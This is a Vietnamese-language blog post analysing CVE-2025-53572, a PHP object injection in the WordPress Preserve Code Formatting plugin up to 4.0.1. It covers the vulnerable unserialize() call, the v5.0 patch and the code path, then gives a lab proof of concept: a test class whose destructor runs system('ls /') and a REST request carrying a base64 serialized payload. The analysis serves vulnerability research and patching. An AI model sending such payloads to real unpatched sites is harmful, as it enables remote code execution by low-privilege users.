---
title: CVE-2025-53572 Analysis & POC
description: Security Vulnerability in WordPress Preserve Code Formatting Plugin.
date: 2025-11-20 19:00:00 +0700
categories: [CVE Analysis]
tags: [analyst, plugin, php object injection]
images: ["app.png"]
featuredImage: "app.png"

lightgallery: true

toc:
  auto: false
---

<!--more-->

## CVE & Basic Info
Lỗ hổng **Deserialization of Untrusted Data** trong Scott Reilly **Preserve Code Formatting** *preserve-code-formatting* cho phép **Object Injection**. Vấn đề này ảnh hưởng đến **Preserve Code Formatting**: từ `n/a` đến <= `4.0.1`.

* **CVE ID**: [CVE-2025-53572](https://www.cve.org/CVERecord?id=CVE-2025-53572)
* **Vulnerability Type**: PHP Object Injection
* **Affected Versions**: <= 4.0.1
* **Patched Versions**: 5.0
* **CVSS severity**: High (8.8)
* **Required Privilege**: Contributor
* **Product**: [WordPress Preserve Code Formatting Plugin](https://wordpress.org/plugins/preserve-code-formatting/)

## Requirements
* **Local WordPress & Debugging**
    * [Virtual Machine](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/)
    * [Docker](https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/)
* **Plugin Version** - **Preserve Code Formatting**:  
    * `4.0.1` – **vulnerable**  
    * `5.0` – **patched**
* **Diff Tool (diff)** → [**Meld**](https://meldmerge.org/) hoặc bất kỳ công cụ diff nào.

## Cause
**Trong phiên bản lỗi (v4.0.1):**

```php {title="preserve-code-formatting.php v4.0.1"}
$data = unserialize( str_replace( $this->chunk_split_token, '', stripslashes( base64_decode( $match[2] ) ) ) );
```

Trong đoạn mã này, hàm **`unserialize()`** được gọi trực tiếp trên dữ liệu người dùng (`$match[2]` sau khi giải mã base64). Điều này tạo ra lỗ hổng nghiêm trọng:

- **Nguy cơ Object Injection**: Nếu attacker chèn payload PHP object vào dữ liệu base64, quá trình decode và unserialize sẽ khởi tạo object độc hại, dẫn đến **Object Injection** và có khả năng tiến tới **Remote Code Execution (RCE)**.  
- **Thiếu kiểm tra an toàn**: Không có bước xác thực dữ liệu trước khi thực hiện unserialize.  
- **Không có cơ chế fallback**: Nếu dữ liệu không hợp lệ hoặc bị lỗi, hệ thống không có phương án xử lý thay thế, khiến ứng dụng dễ bị khai thác.  

**Bản vá (v5.0):** 

![Diff](diff.png "Sự thay đổi của bản vá")

Thay thế `unserialize()` bằng `json_decode()`:

```php {title="preserve-code-formatting.php v5.0"}
$decoded_data = str_replace( $this->chunk_split_token, '', stripslashes( base64_decode( $matches[2] ) ) );
if ( ! $this->is_content_safe( $decoded_data ) ) {
    return $matches[0];
}
$data = json_decode( $decoded_data, true );
if ( $data === null && json_last_error() !== JSON_ERROR_NONE ) {
    $data = $decoded_data;
}
```

Không còn dùng `unserialize()` → loại bỏ hoàn toàn khả năng `PHP Object Injection`.

## Analysis

Plugin đã đăng ký một filter:

```php
add_filter( 'content_save_pre', array( $this, 'preserve_postprocess' ), 100 );
```

Hook `content_save_pre`: được gọi trước khi nội dung bài viết được lưu vào cơ sở dữ liệu. Đây là thời điểm thích hợp để can thiệp, chỉnh sửa hoặc lọc nội dung.

Khi filter được kích hoạt thì callback `preserve_postprocess` được gọi:

```php {title="preserve-code-formatting.php v4.0.1" data-open=true hl_lines=[13,16,19]}
public function preserve_postprocess( $content, $preserve = false ) {
    $options                    = $this->get_options();
    $preserve_tags              = (array) $options['preserve_tags'];
    $wrap_multiline_code_in_pre = (bool)  $options['wrap_multiline_code_in_pre'];
    $result                     = '';

    foreach ( $preserve_tags as $tag ) {
        if ( $result ) {
            $content = $result;
            $result = '';
        }

        $codes = preg_split( "/(\\{\\!\\{{$tag}[^\\]]*\\}\\!\\}.*\\{\\!\\{\\/{$tag}\\}\\!\\})/Us", $content, -1, PREG_SPLIT_DELIM_CAPTURE );

        foreach ( $codes as $code ) {
            if ( preg_match( "/\\{\\!\\{({$tag}[^\\]]*)\\}\\!\\}(.*)\\{\\!\\{\\/{$tag}\\}\\!\\}/Us", $code, $match ) ) {
                // Note: base64_decode is only being used to decode user-supplied content of code tags which
                // had been encoded earlier in the filtering process to prevent modification by WP.
                $data = unserialize( str_replace( $this->chunk_split_token, '', stripslashes( base64_decode( $match[2] ) ) ) );
                if ( $preserve ) {
                    $data = $this->preserve_code_formatting( $data );
                }
                $code = "<{$match[1]}>$data</$tag>";
                if ( $preserve && $wrap_multiline_code_in_pre && ( 'pre' != $tag ) && preg_match( "/\n/", $data ) ) {
                    $code = '<pre>' . $code . '</pre>';
                }
            }
            $result .= $code;
        }
    }

    return $result;
}
```

Đặt breakpoint vào đầu hàm `preserve_postprocess()`, thử tạo một post bất kỳ:

```php {title="Request tạo post" hl_lines=[]}
POST /wp-json/wp/v2/posts/129?_locale=user HTTP/1.1
Host: localhost
Cookie: wp-settings-time-3=1763365761; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=con%7C1763781752%7CrF6XPHmgOzitm7TUKbUcETuuvC9pvGNPsT8bVNxQqoq%7Ce8636ff63b4bdcb466fcd689a839fd0442c9a94b6124977d2dd911a0c0fbf0de; wp-settings-2=libraryContent%3Dbrowse; wp-settings-time-2=1763608953
...
{"id":129,"content":"<!-- wp:paragraph -->\n<p>Payload</p>\n<!-- /wp:paragraph -->","title":"Test","status":"pending"}
```

![Content](content.png "Giá trị của $content")

Ta thấy `$content` sẽ tương ứng với giá trị của `"content"` ta truyền khi tạo post.

```php
$codes = preg_split(
    "/(\{\!\{{$tag}[^\]]*\}\!\}.*\{\!\{\/{$tag}\}\!\})/Us",
    $content,
    -1,
    PREG_SPLIT_DELIM_CAPTURE
);
```

Biểu thức chính quy trên dùng để tìm đoạn mở thẻ `{!{$tag}...}!}` và đóng thẻ `{!{/$tag}!}` cùng nội dung bên trong. Tham số `PREG_SPLIT_DELIM_CAPTURE` giúp giữ lại cả đoạn khớp trong mảng kết quả.  

![Tag](tag.png "Giá trị của $tag")

Nếu `$tag` là `code` hoặc `pre` thì sẽ tách được các khối preserve, còn nếu không khớp thì kết quả trả về chỉ là chính chuỗi `$content` ban đầu.

```php
if ( preg_match( "/\\{\\!\\{({$tag}[^\\]]*)\\}\\!\\}(.*)\\{\\!\\{\\/{$tag}\\}\\!\\}/Us", $code, $match ) ) { ... }
```

`preg_match()` kiểm tra xem `$code` có chứa thẻ preserve mở `{!{$tag}...}!}` và đóng `{!{/{$tag}}!}` hay không. Nếu khớp, `$match[1]` là tên thẻ/thuộc tính, `$match[2]` là nội dung bên trong.

![Match](match.png "Giá trị của $match")

```php
$data = unserialize( str_replace( $this->chunk_split_token, '', stripslashes( base64_decode( $match[2] ) ) ) );
```

Cuối cùng, giá trị của `$match[2]` sẽ được decode base64, loại bỏ ký tự escape bằng `stripslashes()`, xóa token và `unserialize()`

> [!INFO]
> Đúng với mô tả của CVE, để khai thác ta cần đặc quyền **Contributor** dành cho việc tạo bài viết.

## Flow

{{< mermaid >}}
graph TD

A["Contributor submits Post
(Content contains malicious Base64 payload)"]
    --> B["WordPress calls hook: content_save_pre"]

B --> C["Plugin callback: preserve_postprocess()"]

C --> D["Regex extracts preserve blocks"]

D --> E["match[2] = Base64 payload"]

E --> F["base64_decode()"]
F --> G["stripslashes()"]
G --> H["str_replace(chunk_split_token)"]

H --> I["unserialize() on user data (VULNERABLE)"]

I --> J[RCE]
{{< /mermaid >}}

## Proof of Concept (PoC)
1. Tạo class để test đặt trong `wp-config.php`
```php
class Evil
{
    public $command = "ls /";
    public function __destruct()
    {
        die(system($this->command));
    }
}
```
2. Tạo post, cho request đi qua proxy của BurpSuite
3. Gửi lại request với `"content"` là chuỗi serialized được encode base64
```json
{"id":129,"content":"{!{code}!}Tzo0OiJFdmlsIjoxOntzOjc6ImNvbW1hbmQiO3M6NDoibHMgLyI7fQ=={!{/code}!}","title":"Test","status":"pending"}
```
![Result](result.png "Kết quả")

# Conclusion
Phiên bản `<= 4.0.1` của plugin Preserve Code Formatting mắc lỗi nghiêm trọng khi sử dụng `unserialize()` trên dữ liệu đầu vào không được xác thực, cho phép đối tượng PHP tùy ý được khởi tạo trong quá trình xử lý nội dung bài viết. Chỉ cần quyền Contributor, kẻ tấn công có thể đưa payload vào nội dung post, dẫn đến thực thi mã từ xa hoặc thao tác trái phép trên hệ thống. Bản vá `v5.0` đã loại bỏ hoàn toàn việc dùng `unserialize()`, thay thế bằng `json_decode()` và bổ sung bước kiểm tra tính an toàn, từ đó triệt tiêu lỗ hổng Object Injection.

# Key Takeaways
- `unserialize()` trên dữ liệu người dùng là nguy cơ bảo mật nghiêm trọng nếu không được xác thực.
- Hook `content_save_pre` tạo ra bề mặt tấn công vì dữ liệu chưa được lọc khi đi vào hàm xử lý.
- Quyền Contributor đủ để kích hoạt khai thác, mức độ rủi ro cao trên môi trường đa user.
- Bản vá tập trung vào thay đổi cơ chế xử lý dữ liệu đầu vào và thêm xác thực để loại bỏ khả năng tạo object tùy ý.
- Việc thay thế `unserialize()` bằng cơ chế an toàn hơn như JSON là hướng xử lý đúng cho các plugin WordPress tương tự.

## References

[Deserialization](https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html)

[WordPress Preserve Code Formatting Plugin <= 4.0.1 is vulnerable to a high priority PHP Object Injection](https://patchstack.com/database/wordpress/plugin/preserve-code-formatting/vulnerability/wordpress-preserve-code-formatting-plugin-4-0-1-php-object-injection-vulnerability)     
